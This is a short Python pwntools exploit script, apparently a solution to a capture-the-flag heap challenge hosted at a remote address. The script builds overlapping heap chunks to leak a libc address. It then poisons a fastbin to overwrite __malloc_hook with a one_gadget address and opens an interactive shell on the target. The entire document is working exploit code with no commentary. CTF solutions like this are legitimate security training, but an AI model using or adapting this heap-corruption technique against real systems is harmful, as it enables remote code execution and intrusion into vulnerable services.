#!/usr/bin/python3
from pwn import remote, pause, p64, u64
import struct

#Helpers
def malloc(size, data,shell=False):
  io.sendlineafter(b'> ',b'1')
  io.sendlineafter(b'Size: ',str(size).encode())
  if(shell==True):
    return
  io.sendafter(b'Items: ',data)
def free(idx):
  io.sendlineafter(b'> ',b'2')
  io.sendlineafter(b'Index: ',str(idx).encode())

#Exploit
if __name__=='__main__':
  #io = remote('localhost',1337)
  io = remote('gc1.eng.run', 31778)
  malloc(0xf8,b'hk') #0
  malloc(0x18,b'hk') #1
  malloc(0xf8,b'hk') #2
  malloc(0x18,b'hk') #3
  free(1)
  free(0)
  malloc(0x18,p64(0)+p64(0)+p64(0x120)) #0
  free(2)
  malloc(0xf8,b'hk') #1
  io.sendlineafter(b'> ',b'3')
  io.sendlineafter(b'Index: ',b'0')
  io.recvline()
  libc_leak = u64(io.recvline().strip()+b'\0\0')
  libc_base = libc_leak - 0x3c4b78
  print(hex(libc_base))
  malloc(0x68,b'HK') #2
  malloc(0x68,b'HK') #4
  free(2)
  free(4)
  free(0)
  malloc(0x68,p64(libc_base+0x3c4b10-(0x1b+8))) #__malloc_hook #0
  malloc(0x68,b'hk') #2
  malloc(0x68,b'hl') #4
  malloc(0x68,b'hkA'+p64(0)+p64(libc_base+0x4527a)+p64(libc_base+0x84714))
  malloc(0,b'\0\0\0\0',True)
  io.interactive()